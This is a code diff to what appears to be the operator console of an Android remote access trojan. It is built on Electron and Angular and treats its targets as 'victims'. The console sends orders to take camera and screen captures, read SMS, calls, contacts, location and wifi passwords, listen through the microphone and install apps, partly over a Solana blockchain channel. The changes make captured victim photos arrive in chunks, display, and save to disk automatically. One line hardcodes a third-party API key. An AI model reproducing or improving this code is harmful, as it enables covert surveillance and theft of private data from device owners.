@@ -120,9 +120,10 @@ const currentVictim = (remote && remote.getCurrentWebContents && remote.getCurre
 
 function isBlockchainVictim(victim = currentVictim) {
     if (!victim) return false;
-    const connectionType = (victim.connectionType || '').toLowerCase();
-    const conn = (victim.conn || '').toLowerCase();
-    const ipLabel = (victim.ip || '').toLowerCase().trim();
+    // Safely convert to strings - handle cases where values might be objects or other types
+    const connectionType = (typeof victim.connectionType === 'string' ? victim.connectionType : (victim.connectionType ? String(victim.connectionType) : '')).toLowerCase();
+    const conn = (typeof victim.conn === 'string' ? victim.conn : (victim.conn ? String(victim.conn) : '')).toLowerCase();
+    const ipLabel = (typeof victim.ip === 'string' ? victim.ip : (victim.ip ? String(victim.ip) : '')).toLowerCase().trim();
     return !!(
         victim.isBlockchain ||
         connectionType === 'blockchain' ||
@@ -242,21 +243,21 @@ function splitRpcList(value) {
 }
 
 const BLOCKCHAIN_COMMAND_TIMEOUTS = {
-    [CONSTANTS.orders.camera]: 120000,
+    [CONSTANTS.orders.camera]: 180000, // 3 minutes for camera (chunked images can take time)
     [CONSTANTS.orders.fileManager]: 120000,
     [CONSTANTS.orders.calls]: 90000,
     [CONSTANTS.orders.sms]: 90000,
     [CONSTANTS.orders.mic]: 90000,
     [CONSTANTS.orders.location]: 90000,
     [CONSTANTS.orders.contacts]: 90000,
-    [CONSTANTS.orders.deviceInfo]: 60000,
+    [CONSTANTS.orders.deviceInfo]: 120000, // Increased for chunked responses
     [CONSTANTS.orders.apps]: 90000,
     [CONSTANTS.orders.installApp]: 120000,
     [CONSTANTS.orders.uninstallApp]: 120000,
     [CONSTANTS.orders.clipboard]: 60000,
-    [CONSTANTS.orders.wifi]: 60000,
+    [CONSTANTS.orders.wifi]: 120000, // Increased for chunked responses
     [CONSTANTS.orders.wifiPasswords]: 90000,
-    [CONSTANTS.orders.screen]: 120000,
+    [CONSTANTS.orders.screen]: 180000, // 3 minutes for screen (chunked images)
     [CONSTANTS.orders.makeCall]: 90000,
     [CONSTANTS.orders.liveMic]: 90000,
     [CONSTANTS.orders.input]: 90000,
@@ -274,6 +275,8 @@ const FIRE_AND_FORGET_COMMANDS = new Set([
 ]);
 
 const blockchainResponseTimers = new Map();
+const blockchainResponseTimerMetadata = new Map(); // Store original timeout and description
+const sendBlockchainAndPollTimers = new Map(); // Store timers from sendBlockchainAndPoll
 
 function getCommandKey(event, data) {
     return data && data.order ? data.order : event;
@@ -284,6 +287,7 @@ function startBlockchainResponseTimer(key, description, duration) {
     const timeout = duration || BLOCKCHAIN_COMMAND_TIMEOUTS[key] || 90000;
     const timer = setTimeout(() => {
         blockchainResponseTimers.delete(key);
+        blockchainResponseTimerMetadata.delete(key);
         const msg = description || key;
         console.warn(`[LabCtrl] Timeout waiting for ${msg} response`);
         if (rootScope && rootScope.Log) {
@@ -291,6 +295,11 @@ function startBlockchainResponseTimer(key, description, duration) {
         }
     }, timeout);
     blockchainResponseTimers.set(key, timer);
+    blockchainResponseTimerMetadata.set(key, {
+        originalTimeout: timeout,
+        description: description || key,
+        startTime: Date.now()
+    });
 }
 
 function clearBlockchainResponseTimer(key) {
@@ -298,6 +307,44 @@ function clearBlockchainResponseTimer(key) {
     if (timer) {
         clearTimeout(timer);
         blockchainResponseTimers.delete(key);
+        blockchainResponseTimerMetadata.delete(key);
+    }
+}
+
+function resetBlockchainResponseTimer(key) {
+    const metadata = blockchainResponseTimerMetadata.get(key);
+    if (metadata && blockchainResponseTimers.has(key)) {
+        // Clear existing timer
+        const oldTimer = blockchainResponseTimers.get(key);
+        if (oldTimer) {
+            clearTimeout(oldTimer);
+        }
+        // Restart with FULL original timeout (not remaining time)
+        // This ensures we always get the full duration when chunks arrive
+        const timer = setTimeout(() => {
+            blockchainResponseTimers.delete(key);
+            blockchainResponseTimerMetadata.delete(key);
+            const msg = metadata.description || key;
+            console.warn(`[LabCtrl] Timeout waiting for ${msg} response`);
+            if (rootScope && rootScope.Log) {
+                rootScope.Log(`[⚠] Timeout waiting for ${msg} response. Check blockchain connection or permissions.`, CONSTANTS.logStatus.WARNING);
+            }
+        }, metadata.originalTimeout);
+        blockchainResponseTimers.set(key, timer);
+        // Update start time to now so we track from when chunk arrived
+        metadata.startTime = Date.now();
+        console.log(`[LabCtrl] Reset timeout for ${key} (${metadata.originalTimeout}ms from now, chunked response in progress)`);
+    }
+}
+
+function resetAllBlockchainResponseTimers() {
+    // Reset all active timers when chunks are received (we don't know which command the chunk is for)
+    const keys = Array.from(blockchainResponseTimers.keys());
+    keys.forEach(key => {
+        resetBlockchainResponseTimer(key);
+    });
+    if (keys.length > 0) {
+        console.log(`[LabCtrl] Reset ${keys.length} active timer(s) due to chunked response`);
     }
 }
 
@@ -339,7 +386,7 @@ function getSolanaRpcCandidatesLab() {
         blockchainEnv.SOLANA_HELIUS_RPC,
         blockchainEnv.SOLANA_QUICKNODE_RPC,
         blockchainEnv.BLOCKCHAIN_QUICKNODE_RPC,
-        'https://devnet.helius-rpc.com/?api-key=demo',
+        'https://devnet.helius-rpc.com/?api-key=288d548c-1be7-4db4-86c3-60300d282efa', // Helius API key (max 10 req/s)
         'https://solana-devnet.g.alchemy.com/v2/demo',
         'https://api.devnet.solana.com',
         'https://rpc.ankr.com/solana'
@@ -651,16 +698,48 @@ async function sendBlockchainAndPoll(eventName, payload, isFireAndForget = false
     // instead of aggressive polling here
     return new Promise((resolve, reject) => {
         const timeoutMs = BLOCKCHAIN_COMMAND_TIMEOUTS[eventName] || 90000;
-        const timer = setTimeout(() => {
-            socket.removeAllListeners(eventName); // Clean up
-            // Don't reject, just return pending so UI doesn't crash
-            resolve({ pending: true, tx: txSig, rpc: rpcUsed, timeout: true });
-        }, timeoutMs);
+        const state = { resolved: false }; // Use object to allow closure access
+        let timer = null;
+        
+        const createTimer = () => {
+            if (timer) {
+                clearTimeout(timer);
+                sendBlockchainAndPollTimers.delete(eventName);
+            }
+            timer = setTimeout(() => {
+                if (!state.resolved) {
+                    state.resolved = true;
+                    sendBlockchainAndPollTimers.delete(eventName);
+                    socket.removeAllListeners(eventName); // Clean up
+                    console.warn(`[LabCtrl] Timeout waiting for ${eventName} response after ${timeoutMs}ms`);
+                    // Don't reject, just return pending so UI doesn't crash
+                    resolve({ pending: true, tx: txSig, rpc: rpcUsed, timeout: true });
+                }
+            }, timeoutMs);
+            // Store timer reference so it can be reset when chunks arrive
+            sendBlockchainAndPollTimers.set(eventName, { 
+                timer, 
+                timeoutMs, 
+                createTimer, 
+                resolved: () => state.resolved,
+                state: state // Store state object for direct access
+            });
+        };
+        
+        // Create initial timer
+        createTimer();
 
         socket.once(eventName, (data) => {
-            clearTimeout(timer);
-            logToFile('RESPONSE', `blockchain:${eventName}`, data);
-            resolve(data);
+            if (!state.resolved) {
+                state.resolved = true;
+                if (timer) {
+                    clearTimeout(timer);
+                    sendBlockchainAndPollTimers.delete(eventName);
+                }
+                logToFile('RESPONSE', `blockchain:${eventName}`, data);
+                console.log(`[LabCtrl] Received ${eventName} response`);
+                resolve(data);
+            }
         });
     });
 }
@@ -760,16 +839,20 @@ var socket = {
             }
             
             return sendBlockchainAndPoll(action, payload, isFireAndForget)
+                .then((result) => {
+                    // Clear timer only if we got a response (not timeout)
+                    if (result && !result.timeout && !result.pending) {
+                        clearBlockchainResponseTimer(action);
+                    }
+                    return result;
+                })
                 .catch((e) => {
                     console.error('Blockchain send failed', e);
+                    clearBlockchainResponseTimer(action);
                     if (rootScope && rootScope.Log) {
                         rootScope.Log(`[✗] Blockchain send failed: ${e.message}`, CONSTANTS.logStatus.FAIL);
                     }
-                })
-                .finally(() => {
-                    if (!isFireAndForget) {
-                        clearBlockchainResponseTimer(action);
-                    }
+                    throw e;
                 });
         }
         return originalSocket.emit(event, data);
@@ -1122,6 +1205,56 @@ app.controller("LabCtrl", function ($scope, $rootScope, $location, $route, $inte
         $rootScope.Log('[ℹ] Blockchain configuration reloaded', CONSTANTS.logStatus.INFO);
     });
 
+    // Listen for chunked response notifications to reset timeouts
+    ipcRenderer.on('Blockchain:ChunkReceived', (event, chunkInfo) => {
+        if (chunkInfo && chunkInfo.part && chunkInfo.total) {
+            const activeTimers = Array.from(blockchainResponseTimers.keys());
+            const activeSendPollTimers = Array.from(sendBlockchainAndPollTimers.keys());
+            const totalActiveTimers = activeTimers.length + activeSendPollTimers.length;
+            
+            if (totalActiveTimers > 0) {
+                console.log(`[LabCtrl] Chunk ${chunkInfo.part}/${chunkInfo.total} received (${chunkInfo.received || '?'}/${chunkInfo.total}) - resetting ${totalActiveTimers} active timer(s)`);
+                
+                // Reset blockchainResponseTimers
+                if (activeTimers.length > 0) {
+                    resetAllBlockchainResponseTimers();
+                }
+                
+                // Reset sendBlockchainAndPoll timers
+                if (activeSendPollTimers.length > 0) {
+                    activeSendPollTimers.forEach(eventName => {
+                        const timerInfo = sendBlockchainAndPollTimers.get(eventName);
+                        if (timerInfo && timerInfo.state && !timerInfo.state.resolved) {
+                            console.log(`[LabCtrl] Extending timeout for ${eventName} due to chunk reception (${chunkInfo.received}/${chunkInfo.total} chunks)`);
+                            timerInfo.createTimer(); // Reset with full timeout duration
+                        } else if (timerInfo && !timerInfo.resolved()) {
+                            // Fallback to function check
+                            console.log(`[LabCtrl] Extending timeout for ${eventName} due to chunk reception (${chunkInfo.received}/${chunkInfo.total} chunks)`);
+                            timerInfo.createTimer(); // Reset with full timeout duration
+                        }
+                    });
+                }
+                
+                // Also cancel any local response timeouts (like camera controller's setResponseTimeout)
+                // This is a global handler, so we need to find the camera controller's timeout
+                // We'll use a custom event to notify controllers
+                if (rootScope && rootScope.$broadcast) {
+                    rootScope.$broadcast('Blockchain:ChunkReceived', chunkInfo);
+                }
+                
+                // Only log every 10 chunks received (based on count, not part number) to avoid spam
+                const receivedCount = chunkInfo.received || 0;
+                if (receivedCount % 10 === 0 || receivedCount === 1 || receivedCount === chunkInfo.total) {
+                    if (rootScope && rootScope.Log) {
+                        rootScope.Log(`[ℹ] Chunked response: ${receivedCount}/${chunkInfo.total} chunks received - timeout extended`, CONSTANTS.logStatus.INFO);
+                    }
+                }
+            } else {
+                console.warn(`[LabCtrl] Chunk ${chunkInfo.part}/${chunkInfo.total} received but no active timers to reset`);
+            }
+        }
+    });
+
 
 
 
@@ -1179,8 +1312,11 @@ app.controller("CamCtrl", function ($scope, $rootScope, $timeout) {
     $camCtrl.cameras = [];
     $camCtrl.selectedCam = null;
     $camCtrl.imgUrl = null;
+    $scope.imgUrl = null; // Also set directly on scope for template binding
     $camCtrl.load = '';
     $camCtrl.lastError = null;
+    
+    console.log('[CamCtrl] Controller initialized, $scope === $camCtrl:', $scope === $camCtrl);
     var camera = CONSTANTS.orders.camera;
     var currentBase64 = null;
     var responseTimeout = null;
@@ -1189,6 +1325,23 @@ app.controller("CamCtrl", function ($scope, $rootScope, $timeout) {
     $camCtrl.$on('$destroy', () => {
         socket.removeAllListeners(camera);
         if (responseTimeout) $timeout.cancel(responseTimeout);
+    });
+
+    // Listen for chunked response events to reset local timeout
+    $scope.$on('Blockchain:ChunkReceived', (event, chunkInfo) => {
+        if (isBlockchainVictim() && responseTimeout) {
+            // Reset local timeout when chunks arrive (for blockchain mode)
+            console.log('[CamCtrl] Chunk received, resetting local timeout');
+            if (responseTimeout) $timeout.cancel(responseTimeout);
+            // Restart with longer timeout
+            responseTimeout = $timeout(() => {
+                if ($camCtrl.load === 'loading') {
+                    $camCtrl.load = '';
+                    $camCtrl.lastError = `No response from device for camera capture. Check if permissions are granted.`;
+                    $rootScope.Log(`[?] Timeout waiting for camera capture response. Device may need camera permission.`, CONSTANTS.logStatus.WARNING);
+                }
+            }, 180000); // 3 minutes for chunked camera images
+        }
     });
 
     // Check socket connection before sending commands
@@ -1208,7 +1361,14 @@ app.controller("CamCtrl", function ($scope, $rootScope, $timeout) {
     // Set timeout for response
     function setResponseTimeout(action, timeoutMs) {
         if (responseTimeout) $timeout.cancel(responseTimeout);
-        const finalTimeout = timeoutMs || (isBlockchainVictim() ? 120000 : 30000);
+        // For blockchain mode, use the blockchain timer system instead of local timeout
+        // The blockchain timer handles chunked responses and longer timeouts
+        if (isBlockchainVictim()) {
+            // Don't set local timeout for blockchain - use blockchain timer system
+            // The blockchain timer is started in the socket.emit wrapper
+            return;
+        }
+        const finalTimeout = timeoutMs || 30000;
         responseTimeout = $timeout(() => {
             if ($camCtrl.load === 'loading') {
                 $camCtrl.load = '';
@@ -1236,7 +1396,11 @@ app.controller("CamCtrl", function ($scope, $rootScope, $timeout) {
         $camCtrl.load = 'loading';
         $camCtrl.lastError = null;
         $rootScope.Log(`[→] Taking picture with camera ID: ${$camCtrl.selectedCam.id}...`, CONSTANTS.logStatus.INFO);
-        setResponseTimeout('camera capture', 30000);
+        // For blockchain mode, the socket.emit wrapper will start the blockchain timer (180s for camera)
+        // For TCP mode, use local timeout (30s)
+        if (!isBlockchainVictim()) {
+            setResponseTimeout('camera capture', 30000);
+        }
         socket.emit(ORDER, { order: camera, extra: String($camCtrl.selectedCam.id) });
     };
 
@@ -1275,13 +1439,58 @@ app.controller("CamCtrl", function ($scope, $rootScope, $timeout) {
         socket.emit(ORDER, { order: CONSTANTS.orders.foreground, extra: 'background' });
     };
 
+    // Listen for blockchain chunk progress to show upload/download progress
+    let currentChunkInfo = null;
+    $scope.$on('Blockchain:ChunkReceived', (event, chunkInfo) => {
+        // Check if we're in a loading state (either initial 'loading' or already receiving chunks)
+        const isLoading = $camCtrl.load && ($camCtrl.load === 'loading' || $camCtrl.load.indexOf('Receiving') >= 0);
+
+        if (chunkInfo && isLoading) {
+            currentChunkInfo = chunkInfo;
+            // Update load message to show progress (always use received count, not part number)
+            const receivedCount = chunkInfo.received || 0;
+            const percent = receivedCount && chunkInfo.total ? Math.round((receivedCount / chunkInfo.total) * 100) : 0;
+
+            // Use $timeout to ensure digest cycle runs properly
+            $timeout(() => {
+                if (receivedCount && chunkInfo.total) {
+                    $camCtrl.load = `Receiving image: ${receivedCount}/${chunkInfo.total} chunks (${percent}%)`;
+                } else {
+                    $camCtrl.load = `Receiving image chunks...`;
+                }
+            }, 0);
+
+            // Log progress every 20 chunks received (based on count, not part number) or when complete
+            if (receivedCount % 20 === 0 || receivedCount === 1 || receivedCount === chunkInfo.total) {
+                $rootScope.Log(`[⬇] Receiving image: ${receivedCount}/${chunkInfo.total} chunks (${percent}%)`, CONSTANTS.logStatus.INFO);
+            }
+        }
+    });
+
     // Socket handler - improved with error handling
     socket.on(camera, (data) => {
         if (responseTimeout) $timeout.cancel(responseTimeout);
         $camCtrl.load = '';
+        $scope.load = '';
         $camCtrl.lastError = null;
-        
+        currentChunkInfo = null; // Clear chunk info when response received
+
         console.log('[CamCtrl] Received camera data:', data);
+        console.log('[CamCtrl] Data type check - image:', data.image, 'buffer:', !!data.buffer, 'buffer type:', typeof data.buffer);
+        
+        // Check if buffer is complete (not truncated)
+        if (data.buffer && typeof data.buffer === 'string') {
+            const bufferLength = data.buffer.length;
+            console.log('[CamCtrl] Buffer length:', bufferLength);
+            console.log('[CamCtrl] Buffer starts with:', data.buffer.substring(0, 50));
+            console.log('[CamCtrl] Buffer ends with:', data.buffer.substring(Math.max(0, bufferLength - 50)));
+            
+            // Check if buffer looks truncated (ends abruptly without proper Base64 padding)
+            const properEnding = data.buffer.endsWith('==') || data.buffer.endsWith('=') || bufferLength > 50000;
+            if (!properEnding && bufferLength < 1000) {
+                console.warn('[CamCtrl] WARNING: Buffer may be truncated! Length:', bufferLength, 'Ends with:', data.buffer.substring(Math.max(0, bufferLength - 10)));
+            }
+        }
         
         // Handle error responses
         if (data.error) {
@@ -1299,20 +1508,199 @@ app.controller("CamCtrl", function ($scope, $rootScope, $timeout) {
                 $camCtrl.selectedCam = data.list[0];
             }
             $camCtrl.$apply();
-        } else if (data.image == true) {
+        } else if (data.image == true || (data.image !== false && data.buffer)) {
             $rootScope.Log('[✓] Picture captured', CONSTANTS.logStatus.SUCCESS);
             
             // Handle buffer data - can be Base64 string (blockchain) or byte array (TCP)
+            // For blockchain mode, buffer is already Base64 encoded
             if (data.buffer) {
+                const bufferLength = data.buffer.length;
+                console.log('[CamCtrl] Processing image buffer, length:', bufferLength, 'type:', typeof data.buffer);
+                console.log('[CamCtrl] Buffer preview (first 100 chars):', data.buffer.substring(0, 100));
+                console.log('[CamCtrl] Buffer preview (last 50 chars):', data.buffer.substring(Math.max(0, bufferLength - 50)));
+                console.log('[CamCtrl] Buffer ends with:', data.buffer.substring(Math.max(0, bufferLength - 20)));
+                
+                // Check if buffer looks complete (JPEG Base64 should end with specific patterns)
+                const looksComplete = bufferLength > 1000 && (
+                    data.buffer.endsWith('==') || 
+                    data.buffer.endsWith('=') || 
+                    bufferLength > 50000 // Large images are likely complete
+                );
+                console.log('[CamCtrl] Buffer looks complete:', looksComplete);
+                
+                if (!looksComplete && bufferLength < 1000) {
+                    console.error('[CamCtrl] ERROR: Buffer appears incomplete or truncated!');
+                    $rootScope.Log(`[✗] Image buffer appears incomplete (${bufferLength} chars)`, CONSTANTS.logStatus.FAIL);
+                    $camCtrl.lastError = `Image buffer incomplete (${bufferLength} chars)`;
+                    $camCtrl.$apply();
+                    return;
+                }
                 try {
+                    let imageBuffer;
+                    let imageSize;
+                    let isBase64 = false;
+                    
                     if (typeof data.buffer === 'string') {
                         // Base64 string (blockchain mode)
                         currentBase64 = data.buffer;
-                        $camCtrl.imgUrl = 'data:image/jpeg;base64,' + currentBase64;
+                        
+                        // Ensure we have the full buffer (check if it's complete)
+                        if (currentBase64.length < 100) {
+                            console.warn('[CamCtrl] Warning: Base64 buffer seems too short:', currentBase64.length);
+                            $rootScope.Log(`[⚠] Image buffer seems incomplete (${currentBase64.length} chars)`, CONSTANTS.logStatus.WARNING);
+                        }
+                        
+                        // Create data URL for display
+                        const dataUrl = 'data:image/jpeg;base64,' + currentBase64;
+                        
+                        console.log('[CamCtrl] Setting imgUrl, buffer length:', currentBase64.length);
+                        console.log('[CamCtrl] Data URL length:', dataUrl.length);
+                        console.log('[CamCtrl] Data URL preview (first 100):', dataUrl.substring(0, 100));
+                        console.log('[CamCtrl] Data URL preview (last 50):', dataUrl.substring(Math.max(0, dataUrl.length - 50)));
+                        
+                        // Clear loading state first
+                        $camCtrl.load = '';
+                        $scope.load = '';
+                        
+                        // Set image URL - $camCtrl is $scope, so setting on either should work
+                        // But let's be explicit and set on both to ensure template binding works
+                        // IMPORTANT: Set on $scope first, then $camCtrl, since template binds to scope
+                        $scope.imgUrl = dataUrl;
+                        $scope.isSaveShown = true;
+                        $camCtrl.imgUrl = dataUrl;
                         $camCtrl.isSaveShown = true;
+                        
+                        // Also set captureTime for info panel
+                        $scope.captureTime = new Date();
+                        $camCtrl.captureTime = new Date();
+                        
+                        console.log('[CamCtrl] imgUrl set on both $scope and $camCtrl');
+                        console.log('[CamCtrl] $scope.imgUrl exists:', !!$scope.imgUrl, 'length:', $scope.imgUrl ? $scope.imgUrl.length : 0);
+                        console.log('[CamCtrl] $camCtrl.imgUrl exists:', !!$camCtrl.imgUrl, 'length:', $camCtrl.imgUrl ? $camCtrl.imgUrl.length : 0);
+                        console.log('[CamCtrl] $scope.imgUrl === $camCtrl.imgUrl:', $scope.imgUrl === $camCtrl.imgUrl);
+                        
+                        // Verify the data URL is valid
+                        if (dataUrl.length < 100) {
+                            console.error('[CamCtrl] ERROR: Data URL is too short!', dataUrl.length);
+                            $rootScope.Log(`[✗] Image data URL is too short (${dataUrl.length} chars)`, CONSTANTS.logStatus.FAIL);
+                        } else {
+                            console.log('[CamCtrl] Data URL looks valid, length:', dataUrl.length);
+                            
+                            // Test image loading immediately
+                            const testImg = new Image();
+                            testImg.onload = () => {
+                                console.log('[CamCtrl] ✓ Image loaded successfully! Dimensions:', testImg.width, 'x', testImg.height);
+                                // Ensure imgUrl is still set after image loads
+                                if (!$scope.imgUrl) {
+                                    console.log('[CamCtrl] Restoring imgUrl after image load test');
+                                    $scope.imgUrl = dataUrl;
+                                    $camCtrl.imgUrl = dataUrl;
+                                    $scope.$apply();
+                                }
+                            };
+                            testImg.onerror = (e) => {
+                                console.error('[CamCtrl] ✗ Image failed to load!', e);
+                                console.error('[CamCtrl] Data URL preview:', dataUrl.substring(0, 200));
+                            };
+                            testImg.src = dataUrl;
+                        }
+                        
+                        // Force Angular digest cycle to update view - use $timeout to ensure it runs
+                        $timeout(() => {
+                            console.log('[CamCtrl] In $timeout callback, checking imgUrl...');
+                            console.log('[CamCtrl] $scope.imgUrl:', $scope.imgUrl ? 'exists (' + $scope.imgUrl.length + ' chars)' : 'null');
+                            console.log('[CamCtrl] $camCtrl.imgUrl:', $camCtrl.imgUrl ? 'exists (' + $camCtrl.imgUrl.length + ' chars)' : 'null');
+                            
+                            // Double-check it's set
+                            if (!$scope.imgUrl && dataUrl) {
+                                $scope.imgUrl = dataUrl;
+                                $camCtrl.imgUrl = dataUrl;
+                                console.log('[CamCtrl] Restored imgUrl in $timeout');
+                            }
+                            
+                            // Test if we can create an image element to verify the data URL
+                            try {
+                                const testImg = new Image();
+                                testImg.onload = () => {
+                                    console.log('[CamCtrl] ✓ Image data URL is valid! Image dimensions:', testImg.width, 'x', testImg.height);
+                                    $rootScope.Log(`[✓] Image validated: ${testImg.width}x${testImg.height}px`, CONSTANTS.logStatus.SUCCESS);
+                                };
+                                testImg.onerror = (e) => {
+                                    console.error('[CamCtrl] ✗ Image data URL is invalid!', e);
+                                    $rootScope.Log(`[✗] Image data URL is invalid`, CONSTANTS.logStatus.FAIL);
+                                };
+                                testImg.src = dataUrl;
+                            } catch (e) {
+                                console.error('[CamCtrl] Error testing image:', e);
+                            }
+                            
+                            // Force apply if not in digest
+                            try {
+                                if (!$scope.$$phase && !$scope.$root.$$phase) {
+                                    $scope.$apply();
+                                    console.log('[CamCtrl] Called $apply() successfully');
+                                } else {
+                                    console.log('[CamCtrl] Already in digest cycle, using $evalAsync');
+                                    $scope.$evalAsync(() => {
+                                        $scope.imgUrl = dataUrl;
+                                        $camCtrl.imgUrl = dataUrl;
+                                    });
+                                }
+                            } catch (e) {
+                                console.error('[CamCtrl] Error in $apply():', e);
+                                // Fallback: try $evalAsync
+                                $scope.$evalAsync(() => {
+                                    $scope.imgUrl = dataUrl;
+                                    $camCtrl.imgUrl = dataUrl;
+                                });
+                            }
+                        }, 10); // Small delay to ensure it runs
+                        
+                        imageBuffer = currentBase64;
+                        isBase64 = true;
                         // Estimate size from Base64 (Base64 is ~33% larger than binary)
-                        const estimatedSize = Math.round((currentBase64.length * 3 / 4) / 1024);
-                        $rootScope.Log(`[✓] Image received: ${estimatedSize} KB (Base64)`, CONSTANTS.logStatus.SUCCESS);
+                        imageSize = Math.round((currentBase64.length * 3 / 4));
+                        const estimatedSize = Math.round(imageSize / 1024);
+                        const estimatedMB = (imageSize / 1024 / 1024).toFixed(2);
+                        console.log(`[CamCtrl] Image received - Base64 length: ${currentBase64.length}, estimated size: ${estimatedSize} KB (${estimatedMB} MB)`);
+                        console.log(`[CamCtrl] imgUrl set, length: ${dataUrl.length}, preview: ${dataUrl.substring(0, 100)}...`);
+                        $rootScope.Log(`[✓] Image received: ${estimatedSize} KB (${estimatedMB} MB)`, CONSTANTS.logStatus.SUCCESS);
+                        
+                        // Immediately trigger $apply to update view
+                        try {
+                            if (!$scope.$$phase && !$scope.$root.$$phase) {
+                                $scope.$apply();
+                                console.log('[CamCtrl] Immediate $apply() called');
+                            }
+                        } catch (e) {
+                            console.error('[CamCtrl] Error in immediate $apply():', e);
+                        }
+                        
+                        // Final check: verify imgUrl is set and trigger view update
+                        $timeout(() => {
+                            console.log('[CamCtrl] Final check - imgUrl:', $scope.imgUrl ? 'SET (' + $scope.imgUrl.length + ' chars)' : 'NOT SET');
+                            console.log('[CamCtrl] Final check - $camCtrl.imgUrl:', $camCtrl.imgUrl ? 'SET (' + $camCtrl.imgUrl.length + ' chars)' : 'NOT SET');
+                            
+                            // If still not set, force it
+                            if (!$scope.imgUrl && dataUrl) {
+                                console.log('[CamCtrl] imgUrl was lost, restoring...');
+                                $scope.imgUrl = dataUrl;
+                                $camCtrl.imgUrl = dataUrl;
+                            }
+                            
+                            // Force one more apply to ensure view updates
+                            if (!$scope.$$phase && !$scope.$root.$$phase) {
+                                $scope.$apply();
+                                console.log('[CamCtrl] Final $apply() called');
+                            } else {
+                                // Use $evalAsync as fallback
+                                $scope.$evalAsync(() => {
+                                    $scope.imgUrl = dataUrl;
+                                    $camCtrl.imgUrl = dataUrl;
+                                    console.log('[CamCtrl] Used $evalAsync to set imgUrl');
+                                });
+                            }
+                        }, 50);
                     } else if (Array.isArray(data.buffer) || data.buffer instanceof Uint8Array) {
                         // Byte array (TCP mode)
                         var uint8Arr = data.buffer instanceof Uint8Array ? data.buffer : new Uint8Array(data.buffer);
@@ -1322,11 +1710,66 @@ app.controller("CamCtrl", function ($scope, $rootScope, $timeout) {
                         }
                         currentBase64 = window.btoa(binary);
                         
-                        $camCtrl.imgUrl = 'data:image/jpeg;base64,' + currentBase64;
+                        const dataUrl = 'data:image/jpeg;base64,' + currentBase64;
+                        $scope.imgUrl = dataUrl;
+                        $scope.isSaveShown = true;
+                        $camCtrl.imgUrl = dataUrl;
                         $camCtrl.isSaveShown = true;
+                        
+                        // Also set captureTime for info panel
+                        $scope.captureTime = new Date();
+                        $camCtrl.captureTime = new Date();
+                        
+                        // Force apply
+                        if (!$scope.$$phase && !$scope.$root.$$phase) {
+                            $scope.$apply();
+                        }
+                        // Convert to Buffer for saving
+                        imageBuffer = Buffer.from(uint8Arr);
+                        imageSize = uint8Arr.length;
                         $rootScope.Log(`[✓] Image received: ${Math.round(uint8Arr.length/1024)} KB`, CONSTANTS.logStatus.SUCCESS);
                     } else {
                         throw new Error('Unknown buffer format: ' + typeof data.buffer);
+                    }
+                    
+                    // Auto-save photo to file (especially for blockchain mode)
+                    if (imageBuffer) {
+                        const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
+                        const fileName = `photo_${timestamp}.jpg`;
+                        const filePath = path.join(downloadsPath, fileName);
+                        
+                        // Save with appropriate encoding
+                        const saveCallback = (err) => {
+                            if (err) {
+                                console.error('[CamCtrl] Error saving photo:', err);
+                                $rootScope.Log(`[✗] Failed to save photo: ${err.message}`, CONSTANTS.logStatus.FAIL);
+                                // Log to terminal via IPC
+                                if (ipcRenderer) {
+                                    ipcRenderer.send('log-photo-error', { error: err.message, path: filePath });
+                                }
+                            } else {
+                                const sizeMB = (imageSize / 1024 / 1024).toFixed(2);
+                                console.log(`[CamCtrl] Photo saved: ${filePath} (${sizeMB} MB)`);
+                                $rootScope.Log(`[✓] Photo saved: ${fileName} (${sizeMB} MB)`, CONSTANTS.logStatus.SUCCESS);
+                                // Log to terminal via IPC
+                                if (ipcRenderer) {
+                                    ipcRenderer.send('log-photo-saved', { 
+                                        fileName: fileName, 
+                                        filePath: filePath, 
+                                        sizeMB: sizeMB,
+                                        sizeBytes: imageSize
+                                    });
+                                }
+                            }
+                        };
+                        
+                        if (isBase64) {
+                            // Write Base64 string directly with base64 encoding
+                            fs.outputFile(filePath, imageBuffer, 'base64', saveCallback);
+                        } else {
+                            // Write Buffer directly
+                            fs.outputFile(filePath, imageBuffer, saveCallback);
+                        }
                     }
                 } catch (e) {
                     console.error('[CamCtrl] Error processing image:', e);
@@ -1334,16 +1777,73 @@ app.controller("CamCtrl", function ($scope, $rootScope, $timeout) {
                     $rootScope.Log(`[✗] Error processing image: ${e.message}`, CONSTANTS.logStatus.FAIL);
                 }
             } else {
+                console.warn('[CamCtrl] No buffer in data:', data);
                 $camCtrl.lastError = 'No image buffer in response';
                 $rootScope.Log('[✗] No image buffer received', CONSTANTS.logStatus.FAIL);
             }
-            $camCtrl.$apply();
+            
+            // Always apply at the end to ensure view updates
+            $timeout(() => {
+                console.log('[CamCtrl] End of handler - imgUrl:', $scope.imgUrl ? 'SET' : 'NOT SET');
+                if (!$scope.$$phase && !$scope.$root.$$phase) {
+                    $scope.$apply();
+                }
+            }, 0);
+            
+            // Final apply to ensure view updates - always use $timeout to be safe
+            $timeout(() => {
+                // Verify imgUrl is still set
+                if ($scope.imgUrl || $camCtrl.imgUrl) {
+                    const finalImgUrl = $scope.imgUrl || $camCtrl.imgUrl;
+                    console.log('[CamCtrl] Final apply - imgUrl exists:', !!finalImgUrl, 'length:', finalImgUrl ? finalImgUrl.length : 0);
+                    
+                    // Ensure both are set
+                    if ($scope.imgUrl !== finalImgUrl) {
+                        $scope.imgUrl = finalImgUrl;
+                    }
+                    if ($camCtrl.imgUrl !== finalImgUrl) {
+                        $camCtrl.imgUrl = finalImgUrl;
+                    }
+                    
+                    // Log for debugging template binding
+                    console.log('[CamCtrl] Template should show image if ng-if="imgUrl" evaluates to true');
+                    console.log('[CamCtrl] $scope.imgUrl truthy check:', !!$scope.imgUrl);
+                    console.log('[CamCtrl] $camCtrl.imgUrl truthy check:', !!$camCtrl.imgUrl);
+                } else {
+                    console.warn('[CamCtrl] WARNING: imgUrl was lost before final apply!');
+                }
+                
+                // Apply changes
+                if (!$scope.$$phase && !$scope.$root.$$phase) {
+                    $scope.$apply();
+                    console.log('[CamCtrl] Final $apply() completed');
+                } else {
+                    console.log('[CamCtrl] Already in digest, using $evalAsync');
+                    $scope.$evalAsync(() => {
+                        // Re-set imgUrl in evalAsync to ensure it's in the digest
+                        if ($scope.imgUrl || $camCtrl.imgUrl) {
+                            const finalImgUrl = $scope.imgUrl || $camCtrl.imgUrl;
+                            $scope.imgUrl = finalImgUrl;
+                            $camCtrl.imgUrl = finalImgUrl;
+                        }
+                    });
+                }
+            }, 100); // Slightly longer delay to ensure everything is set
         } else if (data.image == false) {
             // Explicit failure
